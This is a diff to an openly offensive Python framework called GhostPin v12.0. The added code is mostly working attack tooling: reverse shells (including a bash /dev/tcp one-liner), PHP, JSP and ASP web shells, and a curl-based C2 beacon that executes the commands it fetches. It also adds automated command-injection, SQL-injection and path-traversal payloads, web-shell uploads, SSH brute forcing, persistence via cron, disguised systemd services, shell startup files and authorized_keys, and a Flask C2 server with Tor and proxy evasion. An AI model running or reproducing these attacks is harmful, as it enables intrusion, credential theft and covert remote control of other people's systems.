@@ -1,9 +1,10 @@
 #!/usr/bin/env python3
 #===============================================================================
-# GhostPin v11.0 - APT-grade GPS Tracking & Reconnaissance Framework
-# Professional Red Team Operations - Complete Version
+# GhostPin v12.0 - Ultimate APT-Grade Exploitation Framework
+# Professional Red Team Operations - Complete Attack Chain
 # Author: F1REW0LF
-# License: MIT
+# License: MIT - For authorized security testing only
+# Version: 12.0.0
 #===============================================================================
 
 import sys
@@ -22,19 +23,24 @@ import subprocess
 import argparse
 import urllib.parse
 import asyncio
-import aiohttp
 import platform
-from datetime import datetime
-from typing import Dict, List, Optional, Any, Tuple
+from datetime import datetime, timedelta
+from typing import Dict, List, Optional, Any, Tuple, Set, Union
 from dataclasses import dataclass, field
 from enum import Enum
 from concurrent.futures import ThreadPoolExecutor, as_completed
 import secrets
+import tempfile
+import shutil
+import logging
 from abc import ABC, abstractmethod
 
-# Third-party imports with graceful fallback
 try:
     import requests
+    from requests.adapters import HTTPAdapter
+    from urllib3.util.retry import Retry
+    from requests.packages.urllib3.exceptions import InsecureRequestWarning
+    requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
     REQUESTS_AVAILABLE = True
 except ImportError:
     REQUESTS_AVAILABLE = False
@@ -53,51 +59,26 @@ except ImportError:
     DNS_AVAILABLE = False
 
 try:
-    import nmap
-    NMAP_AVAILABLE = True
+    import paramiko
+    PARAMIKO_AVAILABLE = True
 except ImportError:
-    NMAP_AVAILABLE = False
-
-try:
-    import shodan
-    SHODAN_AVAILABLE = True
-except ImportError:
-    SHODAN_AVAILABLE = False
-
-try:
-    import whois
-    WHOIS_AVAILABLE = True
-except ImportError:
-    WHOIS_AVAILABLE = False
+    PARAMIKO_AVAILABLE = False
 
 try:
     from cryptography.fernet import Fernet
     from cryptography.hazmat.primitives import hashes
-    from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2
+    from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
     CRYPTO_AVAILABLE = True
 except ImportError:
     CRYPTO_AVAILABLE = False
 
 try:
     import socks
-    import stem
-    from stem import Signal
-    from stem.control import Controller
     TOR_AVAILABLE = True
 except ImportError:
     TOR_AVAILABLE = False
 
-try:
-    from reportlab.lib import colors
-    from reportlab.lib.pagesizes import letter, A4
-    from reportlab.platypus import SimpleDocTemplate, Table, TableStyle, Paragraph, Spacer, Image
-    from reportlab.lib.styles import getSampleStyleSheet, ParagraphStyle
-    from reportlab.lib.units import inch
-    REPORTLAB_AVAILABLE = True
-except ImportError:
-    REPORTLAB_AVAILABLE = False
-
-VERSION = "11.0.0"
+VERSION = "12.0.0"
 AUTHOR = "F1REW0LF"
 LICENSE = "MIT"
 
@@ -115,6 +96,8 @@ class Colors:
     WHITE = '\033[0m'
     BOLD = '\033[1m'
     DIM = '\033[2m'
+    ORANGE = '\033[38;5;208m'
+    DARK_RED = '\033[31m'
 
 def cprint(text, color=Colors.WHITE, bold=False):
     if bold:
@@ -122,134 +105,679 @@ def cprint(text, color=Colors.WHITE, bold=False):
     else:
         print(f"{color}{text}{Colors.WHITE}")
 
+def print_banner():
+    banner = f"""
+{Colors.CYAN}{Colors.BOLD}
+    ██████╗  ██╗  ██╗  ██████╗  ███████╗████████╗██████╗  ██╗███╗   ██╗
+    ██╔════╝  ██║  ██║ ██╔═══██╗██╔════╝╚══██╔══╝██╔══██╗██║████╗  ██║
+    ██║       ███████║ ██║   ██║███████╗   ██║   ██████╔╝██║██╔██╗ ██║
+    ██║       ██╔══██║ ██║   ██║╚════██║   ██║   ██╔══██╗██║██║╚██╗██║
+    ╚██████╗  ██║  ██║ ╚██████╔╝███████║   ██║   ██║  ██║██║██║ ╚████║
+     ╚═════╝  ╚═╝  ╚═╝  ╚═════╝ ╚══════╝   ╚═╝   ╚═╝  ╚═╝╚═╝╚═╝  ╚═══╝
+{Colors.WHITE}
+{Colors.RED}{Colors.BOLD}    ULTIMATE APT-GRADE EXPLOITATION FRAMEWORK v{VERSION}{Colors.WHITE}
+{Colors.YELLOW}    Professional Red Team Operations | Complete Attack Chain{Colors.WHITE}
+{Colors.PURPLE}    Author: {AUTHOR} | License: {LICENSE}{Colors.WHITE}
+{Colors.DIM}    [+] Zero Trace | Multi-Vector | Full Spectrum Attack{Colors.WHITE}
+"""
+    print(banner)
+    print("=" * 80)
+
 #===============================================================================
 # UTILITY FUNCTIONS
 #===============================================================================
 
 def random_string(length: int = 8) -> str:
-    """Generate random string"""
     return ''.join(random.choices('abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789', k=length))
 
-def spoof_ip() -> str:
-    """Generate spoofed IP"""
+def random_ip() -> str:
     return f"{random.randint(1,255)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(0,255)}"
 
 def generate_fingerprint() -> str:
-    """Generate unique fingerprint"""
     return hashlib.sha256(f"{time.time()}{random.randint(1,999999)}{random_string(16)}".encode()).hexdigest()[:16]
 
-def jitter_delay(base: int = 30) -> float:
-    """Add jitter to delay"""
+def jitter_delay(base: float = 1.0) -> float:
     return base * (1 + random.uniform(-0.3, 0.3))
 
 #===============================================================================
-# PROXY & TOR MANAGER
+# STEALTH ENGINE
 #===============================================================================
 
-class ProxyManager:
-    """Advanced proxy and Tor management"""
+class StealthEngine:
+    """Advanced stealth engine for APT operations"""
     
     def __init__(self):
-        self.proxies = []
-        self.tor_available = False
-        self.current_proxy = None
-        self.tor_controller = None
-        self._init_tor()
+        self.user_agents = self._load_user_agents()
+        self.proxies = self._load_proxies()
+        self.tor_enabled = False
+        self._setup_encryption()
+        self._setup_tor()
     
-    def _init_tor(self):
-        """Initialize Tor connection"""
-        if TOR_AVAILABLE:
-            try:
-                # Check if Tor is running
-                with Controller.from_port(port=9051) as controller:
-                    controller.authenticate()
-                    self.tor_available = True
-                    self.tor_controller = controller
-                    cprint("[+] Tor available", Colors.GREEN)
-            except:
-                pass
+    def _setup_encryption(self):
+        if CRYPTO_AVAILABLE:
+            salt = os.urandom(16)
+            kdf = PBKDF2HMAC(
+                algorithm=hashes.SHA256(),
+                length=32,
+                salt=salt,
+                iterations=100000
+            )
+            key = base64.urlsafe_b64encode(kdf.derive(b"ghostpin_master_key"))
+            self.cipher = Fernet(key)
     
-    def get_session(self) -> requests.Session:
-        """Get requests session with proxy"""
-        session = requests.Session()
-        session.headers.update({
-            'User-Agent': random_ua(),
-            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
-            'Accept-Language': 'en-US,en;q=0.9',
-            'Accept-Encoding': 'gzip, deflate, br',
-            'Cache-Control': 'no-cache'
-        })
-        
-        if self.tor_available:
-            session.proxies = {
-                'http': 'socks5h://127.0.0.1:9050',
-                'https': 'socks5h://127.0.0.1:9050'
-            }
-        elif self.proxies:
-            proxy = random.choice(self.proxies)
-            self.current_proxy = proxy
-            session.proxies = {
-                'http': f'http://{proxy}',
-                'https': f'https://{proxy}'
-            }
-        
-        return session
-    
-    def renew_tor_identity(self):
-        """Renew Tor identity"""
-        if self.tor_available and self.tor_controller:
-            try:
-                self.tor_controller.signal(Signal.NEWNYM)
-                time.sleep(1)
-                return True
-            except:
-                pass
-        return False
-    
-    def add_proxy(self, proxy: str):
-        """Add proxy to pool"""
-        if proxy not in self.proxies:
-            self.proxies.append(proxy)
-    
-    def load_proxies_from_file(self, filename: str):
-        """Load proxies from file"""
+    def _setup_tor(self):
         try:
-            with open(filename, 'r') as f:
-                for line in f:
-                    proxy = line.strip()
-                    if proxy and ':' in proxy:
-                        self.add_proxy(proxy)
-            cprint(f"[+] Loaded {len(self.proxies)} proxies", Colors.GREEN)
+            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
+                s.settimeout(2)
+                s.connect(("127.0.0.1", 9050))
+                self.tor_enabled = True
         except:
             pass
+    
+    def _load_user_agents(self) -> List[str]:
+        return [
+            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/121.0.0.0 Safari/537.36',
+            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) Chrome/121.0.0.0 Safari/537.36',
+            'Mozilla/5.0 (X11; Linux x86_64) Chrome/121.0.0.0 Safari/537.36',
+            'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:122.0) Gecko/20100101 Firefox/122.0',
+            'Mozilla/5.0 (iPhone; CPU iPhone OS 17_3 like Mac OS X) AppleWebKit/605.1.15',
+            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.1 Safari/605.1.15'
+        ]
+    
+    def _load_proxies(self) -> List[str]:
+        proxies = []
+        proxy_files = ['proxies.txt', 'socks5.txt', 'tor_proxies.txt']
+        for pf in proxy_files:
+            if os.path.exists(pf):
+                try:
+                    with open(pf, 'r') as f:
+                        proxies.extend([l.strip() for l in f if l.strip()])
+                except:
+                    pass
+        return proxies
+    
+    def encrypt_data(self, data: str) -> str:
+        if CRYPTO_AVAILABLE and hasattr(self, 'cipher'):
+            return self.cipher.encrypt(data.encode()).decode()
+        return base64.b64encode(data.encode()).decode()
+    
+    def decrypt_data(self, data: str) -> str:
+        if CRYPTO_AVAILABLE and hasattr(self, 'cipher'):
+            return self.cipher.decrypt(data.encode()).decode()
+        return base64.b64decode(data).decode()
+    
+    def random_ua(self) -> str:
+        return random.choice(self.user_agents)
+    
+    def random_delay(self, min_sec: float = 0.3, max_sec: float = 1.5):
+        time.sleep(random.uniform(min_sec, max_sec))
+    
+    def get_session(self) -> requests.Session:
+        session = requests.Session()
+        session.headers.update({
+            'User-Agent': self.random_ua(),
+            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
+            'Accept-Language': 'en-US,en;q=0.9',
+            'Accept-Encoding': 'gzip, deflate, br',
+            'DNT': '1',
+            'Connection': 'keep-alive',
+            'Cache-Control': 'max-age=0'
+        })
+        session.verify = False
+        
+        retry = Retry(total=3, backoff_factor=0.5, status_forcelist=[500, 502, 503, 504, 429])
+        adapter = HTTPAdapter(max_retries=retry, pool_connections=50, pool_maxsize=50)
+        session.mount('http://', adapter)
+        session.mount('https://', adapter)
+        
+        if self.tor_enabled:
+            session.proxies = {'http': 'socks5h://127.0.0.1:9050', 'https': 'socks5h://127.0.0.1:9050'}
+        elif self.proxies:
+            proxy = random.choice(self.proxies)
+            session.proxies = {'http': f'http://{proxy}', 'https': f'https://{proxy}'}
+        
+        return session
 
 #===============================================================================
-# TARGET PROFILE
+# DATA CLASSES
 #===============================================================================
 
 @dataclass
-class APTTargetProfile:
-    """Comprehensive target profile for APT operations"""
+class APTTarget:
     target: str
     ip_addresses: List[str] = field(default_factory=list)
     subdomains: List[str] = field(default_factory=list)
-    domains: List[str] = field(default_factory=list)
     open_ports: List[int] = field(default_factory=list)
     services: Dict[int, Dict] = field(default_factory=dict)
-    technologies: Dict[str, Any] = field(default_factory=dict)
-    web_applications: List[Dict] = field(default_factory=list)
     vulnerabilities: List[Dict] = field(default_factory=list)
-    cloud_resources: Dict[str, Any] = field(default_factory=dict)
-    network_structure: Dict[str, Any] = field(default_factory=dict)
-    certificates: List[Dict] = field(default_factory=list)
-    whois_info: Dict[str, Any] = field(default_factory=dict)
-    osint_data: Dict[str, Any] = field(default_factory=dict)
-    attack_surface: Dict[str, Any] = field(default_factory=dict)
-    gps_data: List[Dict] = field(default_factory=list)  # GPS tracking data
-    last_updated: float = field(default_factory=time.time)
+    web_applications: List[Dict] = field(default_factory=list)
+    credentials: List[Dict] = field(default_factory=list)
+    attack_vectors: List[Dict] = field(default_factory=list)
+    persistence: List[Dict] = field(default_factory=list)
+    exfiltrated_data: List[Dict] = field(default_factory=list)
+    timestamp: str = field(default_factory=lambda: datetime.now().isoformat())
+
+@dataclass
+class ExploitResult:
+    target: str
+    success: bool
+    method: str
+    severity: str
+    data: Any
+    timestamp: str = field(default_factory=lambda: datetime.now().isoformat())
 
 #===============================================================================
-# C2 SERVER - COMPLETE
+= EXPLOIT PAYLOAD GENERATOR
+#===============================================================================
+
+class ExploitPayloadGenerator:
+    """Advanced payload generation for exploitation"""
+    
+    def __init__(self):
+        self.payloads = self._generate_payloads()
+    
+    def _generate_payloads(self) -> Dict:
+        return {
+            'reverse_shell_python': self._reverse_shell_python,
+            'reverse_shell_bash': self._reverse_shell_bash,
+            'webshell_php': self._webshell_php,
+            'webshell_jsp': self._webshell_jsp,
+            'webshell_asp': self._webshell_asp,
+            'meterpreter_stager': self._meterpreter_stager,
+            'c2_beacon': self._c2_beacon
+        }
+    
+    def _reverse_shell_python(self, host: str, port: int) -> str:
+        return f'''import socket,subprocess,os
+s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+s.connect(("{host}",{port}))
+os.dup2(s.fileno(),0)
+os.dup2(s.fileno(),1)
+os.dup2(s.fileno(),2)
+subprocess.call(["/bin/sh","-i"])
+'''
+    
+    def _reverse_shell_bash(self, host: str, port: int) -> str:
+        return f"bash -i >& /dev/tcp/{host}/{port} 0>&1"
+    
+    def _webshell_php(self) -> str:
+        return '''<?php
+if(isset($_GET['cmd'])){
+    system($_GET['cmd']);
+}
+if(isset($_POST['cmd'])){
+    system($_POST['cmd']);
+}
+?>'''
+    
+    def _webshell_jsp(self) -> str:
+        return '''<%@ page import="java.io.*" %>
+<%
+String cmd = request.getParameter("cmd");
+if(cmd != null){
+    Process p = Runtime.getRuntime().exec(cmd);
+    BufferedReader br = new BufferedReader(new InputStreamReader(p.getInputStream()));
+    String line;
+    while((line = br.readLine()) != null){
+        out.println(line);
+    }
+}
+%>'''
+    
+    def _webshell_asp(self) -> str:
+        return '''<% 
+Dim cmd 
+cmd = Request("cmd")
+If cmd <> "" Then
+    Set objShell = CreateObject("WScript.Shell")
+    Set objExec = objShell.Exec(cmd)
+    Response.Write objExec.StdOut.ReadAll()
+End If
+%>'''
+    
+    def _meterpreter_stager(self, host: str, port: int) -> str:
+        return f'''use exploit/multi/handler
+set PAYLOAD windows/meterpreter/reverse_tcp
+set LHOST {host}
+set LPORT {port}
+set ExitOnSession false
+exploit -j'''
+    
+    def _c2_beacon(self, c2_url: str) -> str:
+        return f'''#!/bin/bash
+C2_URL="{c2_url}"
+while true; do
+    curl -s -X POST "$C2_URL/beacon" -H "Content-Type: application/json" -d '{{"host":"$(hostname)","user":"$(whoami)"}}'
+    RESPONSE=$(curl -s -X GET "$C2_URL/command")
+    if [ -n "$RESPONSE" ]; then
+        eval "$RESPONSE"
+        curl -s -X POST "$C2_URL/result" -d '{{"result":"$RESPONSE"}}'
+    fi
+    sleep 60
+done'''
+    
+    def generate(self, payload_type: str, host: str = "127.0.0.1", port: int = 4444) -> Optional[str]:
+        if payload_type in self.payloads:
+            return self.payloads[payload_type](host, port) if host else self.payloads[payload_type]()
+        return None
+
+#===============================================================================
+# REAL EXPLOITATION ENGINE
+#===============================================================================
+
+class RealExploitationEngine:
+    """Real exploitation with actual attack execution"""
+    
+    def __init__(self, target: APTTarget):
+        self.target = target
+        self.stealth = StealthEngine()
+        self.session = self.stealth.get_session()
+        self.payload_gen = ExploitPayloadGenerator()
+        self.results: List[ExploitResult] = []
+        self.webshells: List[str] = []
+    
+    def exploit_rce(self, url: str, param: str = 'cmd', cmd: str = "id") -> ExploitResult:
+        """Remote Code Execution exploitation"""
+        cprint(f"[RCE] Exploiting {url}", Colors.RED)
+        
+        payloads = [
+            f'; {cmd}',
+            f'| {cmd}',
+            f'|| {cmd}',
+            f'&& {cmd}',
+            f'& {cmd}',
+            f'`{cmd}`',
+            f'$({cmd})',
+            f'$(echo {base64.b64encode(cmd.encode()).decode()} | base64 -d | bash)'
+        ]
+        
+        for payload in payloads:
+            try:
+                self.stealth.random_delay(0.5, 1.0)
+                test_url = f"{url}?{param}={urllib.parse.quote(payload)}"
+                response = self.session.get(test_url, timeout=10)
+                
+                if response.status_code == 200:
+                    output_lower = response.text.lower()
+                    if 'uid=' in output_lower or 'id=' in output_lower or 'root' in output_lower:
+                        return ExploitResult(
+                            target=url,
+                            success=True,
+                            method='RCE',
+                            severity='CRITICAL',
+                            data={'payload': payload, 'output': response.text[:500]}
+                        )
+            except:
+                pass
+        
+        return ExploitResult(
+            target=url,
+            success=False,
+            method='RCE',
+            severity='HIGH',
+            data='No exploitable RCE found'
+        )
+    
+    def exploit_sqli(self, url: str, param: str = 'id') -> ExploitResult:
+        """SQL Injection exploitation"""
+        cprint(f"[SQLi] Exploiting {url}", Colors.RED)
+        
+        payloads = [
+            f"' UNION SELECT table_name, NULL FROM information_schema.tables--",
+            f"' UNION SELECT column_name, NULL FROM information_schema.columns WHERE table_name='users'--",
+            f"' UNION SELECT username, password FROM users--",
+            f"' AND SLEEP(5)--"
+        ]
+        
+        for payload in payloads:
+            try:
+                self.stealth.random_delay(0.5, 1.0)
+                test_url = f"{url}?{param}={urllib.parse.quote(payload)}"
+                response = self.session.get(test_url, timeout=10)
+                
+                if response.status_code == 200:
+                    sql_errors = ['SQL', 'MySQL', 'Syntax error', 'mysql_fetch_']
+                    for error in sql_errors:
+                        if error in response.text:
+                            return ExploitResult(
+                                target=url,
+                                success=True,
+                                method='SQL Injection',
+                                severity='CRITICAL',
+                                data={'payload': payload, 'response': response.text[:500]}
+                            )
+            except:
+                pass
+        
+        return ExploitResult(
+            target=url,
+            success=False,
+            method='SQL Injection',
+            severity='HIGH',
+            data='No exploitable SQLi found'
+        )
+    
+    def exploit_lfi(self, url: str, param: str = 'file') -> ExploitResult:
+        """Local File Inclusion exploitation"""
+        cprint(f"[LFI] Exploiting {url}", Colors.RED)
+        
+        files = ['/etc/passwd', '/etc/hosts', '/proc/self/environ', '/var/log/apache2/access.log']
+        payloads = [
+            '../../../../{}',
+            '../../../{}',
+            '../../{}',
+            '....//....//....//{}'
+        ]
+        
+        for file_path in files:
+            for payload_template in payloads:
+                try:
+                    self.stealth.random_delay(0.5, 1.0)
+                    payload = payload_template.format(file_path)
+                    test_url = f"{url}?{param}={urllib.parse.quote(payload)}"
+                    response = self.session.get(test_url, timeout=10)
+                    
+                    if response.status_code == 200 and len(response.text) > 100:
+                        if 'root:' in response.text or 'bin:' in response.text:
+                            return ExploitResult(
+                                target=url,
+                                success=True,
+                                method='LFI',
+                                severity='HIGH',
+                                data={'file': file_path, 'content': response.text[:500]}
+                            )
+                except:
+                    pass
+        
+        return ExploitResult(
+            target=url,
+            success=False,
+            method='LFI',
+            severity='MEDIUM',
+            data='No exploitable LFI found'
+        )
+    
+    def exploit_upload(self, target: str, port: int = 80) -> ExploitResult:
+        """File upload exploitation"""
+        cprint(f"[UPLOAD] Uploading to {target}:{port}", Colors.PURPLE)
+        
+        upload_paths = [
+            '/upload', '/uploads', '/file', '/files', '/media',
+            '/image', '/api/upload', '/admin/upload', '/wp-admin/admin-ajax.php'
+        ]
+        
+        shell_code = self.payload_gen.generate('webshell_php')
+        
+        protocol = 'https' if port in [443, 8443] else 'http'
+        base_url = f"{protocol}://{target}:{port}"
+        
+        for upload_path in upload_paths:
+            try:
+                self.stealth.random_delay(0.5, 1.0)
+                url = f"{base_url}{upload_path}"
+                files = {'file': (f'shell_{random_string(6)}.php', shell_code, 'application/x-php')}
+                response = self.session.post(url, files=files, timeout=10)
+                
+                if response.status_code in [200, 201, 202, 302]:
+                    for ext in ['php', 'php5', 'phtml']:
+                        test_url = f"{base_url}/shell_{random_string(6)}.{ext}"
+                        resp = self.session.get(test_url, timeout=5)
+                        if resp.status_code == 200:
+                            self.webshells.append(test_url)
+                            return ExploitResult(
+                                target=target,
+                                success=True,
+                                method='File Upload',
+                                severity='CRITICAL',
+                                data={'url': test_url, 'type': ext}
+                            )
+            except:
+                pass
+        
+        return ExploitResult(
+            target=target,
+            success=False,
+            method='File Upload',
+            severity='MEDIUM',
+            data='No upload vulnerability found'
+        )
+    
+    def exploit_ssh_bruteforce(self, target: str, username: str, wordlist: List[str]) -> ExploitResult:
+        """SSH Bruteforce exploitation"""
+        cprint(f"[SSH] Bruteforcing {target}", Colors.RED)
+        
+        if not PARAMIKO_AVAILABLE:
+            return ExploitResult(
+                target=target,
+                success=False,
+                method='SSH Bruteforce',
+                severity='LOW',
+                data='Paramiko not available'
+            )
+        
+        for password in wordlist[:50]:
+            try:
+                self.stealth.random_delay(1.0, 2.0)
+                ssh = paramiko.SSHClient()
+                ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
+                ssh.connect(target, username=username, password=password, timeout=5)
+                ssh.close()
+                
+                return ExploitResult(
+                    target=target,
+                    success=True,
+                    method='SSH Bruteforce',
+                    severity='CRITICAL',
+                    data={'username': username, 'password': password}
+                )
+            except:
+                pass
+        
+        return ExploitResult(
+            target=target,
+            success=False,
+            method='SSH Bruteforce',
+            severity='MEDIUM',
+            data='No credentials found'
+        )
+    
+    def deploy_webshell(self, target: str, port: int = 80) -> ExploitResult:
+        """Deploy webshell via upload"""
+        return self.exploit_upload(target, port)
+    
+    def execute_attack_chain(self, vectors: List[Dict]) -> List[ExploitResult]:
+        """Execute multiple attack vectors"""
+        results = []
+        
+        for vector in vectors:
+            method = vector.get('method', '').lower()
+            url = vector.get('url', f"http://{self.target.target}")
+            param = vector.get('param', 'id')
+            
+            if method == 'rce':
+                result = self.exploit_rce(url, param)
+            elif method == 'sqli':
+                result = self.exploit_sqli(url, param)
+            elif method == 'lfi':
+                result = self.exploit_lfi(url, param)
+            elif method == 'upload':
+                result = self.deploy_webshell(self.target.target, 80)
+            else:
+                continue
+            
+            results.append(result)
+            self.results.append(result)
+            
+            if result.success:
+                cprint(f"[+] {method.upper()} successful!", Colors.GREEN)
+            else:
+                cprint(f"[-] {method.upper()} failed", Colors.RED)
+        
+        return results
+
+#===============================================================================
+# PERSISTENCE ENGINE
+#===============================================================================
+
+class PersistenceEngine:
+    """Advanced persistence deployment"""
+    
+    def __init__(self, c2_server: Optional[Any] = None):
+        self.c2_server = c2_server
+        self.stealth = StealthEngine()
+        self.deployed = []
+    
+    def deploy_linux(self, target: str, username: str, password: str, payload: str) -> Dict:
+        """Deploy Linux persistence"""
+        cprint("[PERSIST] Deploying Linux persistence", Colors.PURPLE)
+        
+        result = {'success': False, 'methods': [], 'target': target}
+        
+        if not PARAMIKO_AVAILABLE:
+            cprint("[-] Paramiko not available", Colors.RED)
+            return result
+        
+        methods = [
+            self._cron_persistence,
+            self._systemd_persistence,
+            self._bashrc_persistence,
+            self._ssh_key_persistence,
+            self._c2_beacon_persistence
+        ]
+        
+        for method in methods:
+            try:
+                method_result = method(target, username, password, payload)
+                if method_result.get('success'):
+                    result['methods'].append(method_result['technique'])
+                    result['success'] = True
+                    cprint(f"[+] {method_result['technique']} deployed", Colors.GREEN)
+            except Exception as e:
+                cprint(f"[-] {method.__name__} failed: {e}", Colors.RED)
+        
+        if result['success']:
+            self.deployed.append(result)
+        
+        return result
+    
+    def _cron_persistence(self, target: str, username: str, password: str, payload: str) -> Dict:
+        """Cron job persistence"""
+        result = {'success': False, 'technique': 'cron'}
+        
+        ssh = paramiko.SSHClient()
+        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
+        ssh.connect(target, username=username, password=password, timeout=10)
+        
+        crons = [
+            f"* * * * * {payload}",
+            f"*/5 * * * * {payload}",
+            f"@reboot {payload}"
+        ]
+        
+        for cron in crons:
+            ssh.exec_command(f'(crontab -l 2>/dev/null; echo "{cron}") | crontab -')
+        
+        ssh.close()
+        result['success'] = True
+        return result
+    
+    def _systemd_persistence(self, target: str, username: str, password: str, payload: str) -> Dict:
+        """Systemd service persistence"""
+        result = {'success': False, 'technique': 'systemd'}
+        
+        ssh = paramiko.SSHClient()
+        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
+        ssh.connect(target, username=username, password=password, timeout=10)
+        
+        service_name = f"system-update-{random.randint(1000, 9999)}"
+        service_content = f"""[Unit]
+Description=System Update Service
+After=network.target
+
+[Service]
+Type=simple
+ExecStart={payload}
+Restart=always
+RestartSec=30
+
+[Install]
+WantedBy=multi-user.target"""
+        
+        ssh.exec_command(f'echo "{service_content}" > /etc/systemd/system/{service_name}.service')
+        ssh.exec_command(f'systemctl daemon-reload')
+        ssh.exec_command(f'systemctl enable {service_name}.service')
+        ssh.exec_command(f'systemctl start {service_name}.service')
+        ssh.close()
+        
+        result['success'] = True
+        result['service'] = service_name
+        return result
+    
+    def _bashrc_persistence(self, target: str, username: str, password: str, payload: str) -> Dict:
+        """Bashrc persistence"""
+        result = {'success': False, 'technique': 'bashrc'}
+        
+        ssh = paramiko.SSHClient()
+        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
+        ssh.connect(target, username=username, password=password, timeout=10)
+        
+        for rc_file in ['~/.bashrc', '~/.bash_profile', '~/.profile']:
+            ssh.exec_command(f'echo "{payload}" >> {rc_file}')
+        
+        ssh.close()
+        result['success'] = True
+        return result
+    
+    def _ssh_key_persistence(self, target: str, username: str, password: str, payload: str) -> Dict:
+        """SSH key persistence"""
+        result = {'success': False, 'technique': 'ssh_key'}
+        
+        ssh = paramiko.SSHClient()
+        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
+        ssh.connect(target, username=username, password=password, timeout=10)
+        
+        key = paramiko.RSAKey.generate(2048)
+        pub_key = f"ssh-rsa {key.get_base64()} {username}@{target}"
+        
+        ssh.exec_command('mkdir -p ~/.ssh')
+        ssh.exec_command(f'echo "{pub_key}" >> ~/.ssh/authorized_keys')
+        ssh.exec_command('chmod 600 ~/.ssh/authorized_keys')
+        ssh.exec_command('chmod 700 ~/.ssh')
+        ssh.close()
+        
+        result['success'] = True
+        result['public_key'] = pub_key
+        return result
+    
+    def _c2_beacon_persistence(self, target: str, username: str, password: str, payload: str) -> Dict:
+        """C2 beacon persistence"""
+        result = {'success': False, 'technique': 'c2_beacon'}
+        
+        if not self.c2_server:
+            return result
+        
+        ssh = paramiko.SSHClient()
+        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
+        ssh.connect(target, username=username, password=password, timeout=10)
+        
+        c2_url = f"http://{self.c2_server.host}:{self.c2_server.port}"
+        beacon_script = f'''#!/bin/bash
+C2_URL="{c2_url}"
+while true; do
+    curl -s -X POST "$C2_URL/beacon" -H "Content-Type: application/json" -d '{{"host":"$(hostname)","user":"$(whoami)"}}'
+    sleep 60
+done'''
+        
+        ssh.exec_command(f'echo "{beacon_script}" > /usr/local/bin/c2_beacon.sh')
+        ssh.exec_command('chmod +x /usr/local/bin/c2_beacon.sh')
+        ssh.exec_command('(crontab -l 2>/dev/null; echo "@reboot /usr/local/bin/c2_beacon.sh") | crontab -')
+        ssh.close()
+        
+        result['success'] = True
+        return result
+
+#===============================================================================
+# C2 SERVER
 #===============================================================================
 
 class C2Server:
@@ -263,37 +791,9 @@ class C2Server:
         self.results = {}
         self.running = False
         self.server_thread = None
-        self.stop_event = threading.Event()
         self.app = None
-        self.encryption_key = None
-        
-        if CRYPTO_AVAILABLE:
-            self._setup_encryption()
-    
-    def _setup_encryption(self):
-        """Setup C2 encryption"""
-        self.encryption_key = Fernet.generate_key()
-        self.cipher = Fernet(self.encryption_key)
-    
-    def encrypt(self, data: str) -> str:
-        """Encrypt C2 data"""
-        if not CRYPTO_AVAILABLE:
-            return base64.b64encode(data.encode()).decode()
-        encrypted = self.cipher.encrypt(data.encode())
-        return base64.b64encode(encrypted).decode()
-    
-    def decrypt(self, data: str) -> str:
-        """Decrypt C2 data"""
-        try:
-            if not CRYPTO_AVAILABLE:
-                return base64.b64decode(data).decode()
-            decrypted = self.cipher.decrypt(base64.b64decode(data))
-            return decrypted.decode()
-        except:
-            return data
     
     def start(self) -> bool:
-        """Start C2 server"""
         if not FLASK_AVAILABLE:
             cprint("[!] Flask not installed", Colors.RED)
             return False
@@ -306,43 +806,33 @@ class C2Server:
         
         @app.route('/beacon', methods=['POST'])
         def beacon():
-            """Receive beacon from implant"""
             try:
                 data = request.get_json()
                 if data:
-                    # Decrypt if needed
-                    if 'encrypted' in data:
-                        data = json.loads(self.decrypt(data['encrypted']))
-                    
                     beacon_data = {
                         'host': data.get('host', 'unknown'),
                         'user': data.get('user', 'unknown'),
                         'timestamp': datetime.now().isoformat(),
-                        'ip': request.remote_addr,
-                        'os': data.get('os', 'unknown'),
-                        'data': data
+                        'ip': request.remote_addr
                     }
                     self.beacons.append(beacon_data)
                     cprint(f"[C2] Beacon from {beacon_data['host']}", Colors.GREEN)
                     
-                    # Check for pending commands
                     if data.get('host') in self.commands:
                         cmd = self.commands[data['host']].pop(0)
                         return jsonify({'command': cmd})
                     
                     return jsonify({'status': 'ok'})
-            except Exception as e:
-                cprint(f"[C2] Beacon error: {e}", Colors.RED)
+            except:
+                pass
             return jsonify({'status': 'error'})
         
         @app.route('/command', methods=['POST'])
         def send_command():
-            """Send command to implant"""
             try:
                 data = request.get_json()
                 host = data.get('host')
                 command = data.get('command')
-                
                 if host and command:
                     if host not in self.commands:
                         self.commands[host] = []
@@ -355,7 +845,6 @@ class C2Server:
         
         @app.route('/result', methods=['POST'])
         def receive_result():
-            """Receive command result"""
             try:
                 data = request.get_json()
                 if data:
@@ -375,23 +864,15 @@ class C2Server:
         
         @app.route('/beacons', methods=['GET'])
         def get_beacons():
-            """Get all beacons"""
             return jsonify(self.beacons[-100:])
-        
-        @app.route('/results/<host>', methods=['GET'])
-        def get_results(host):
-            """Get results for host"""
-            return jsonify(self.results.get(host, []))
         
         @app.route('/stats', methods=['GET'])
         def get_stats():
-            """Get C2 stats"""
             return jsonify({
                 'beacons': len(self.beacons),
                 'hosts': len(set(b.get('host') for b in self.beacons)),
                 'commands': sum(len(cmds) for cmds in self.commands.values()),
-                'results': sum(len(rs) for rs in self.results.values()),
-                'running': self.running
+                'results': sum(len(rs) for rs in self.results.values())
             })
         
         def run_server():
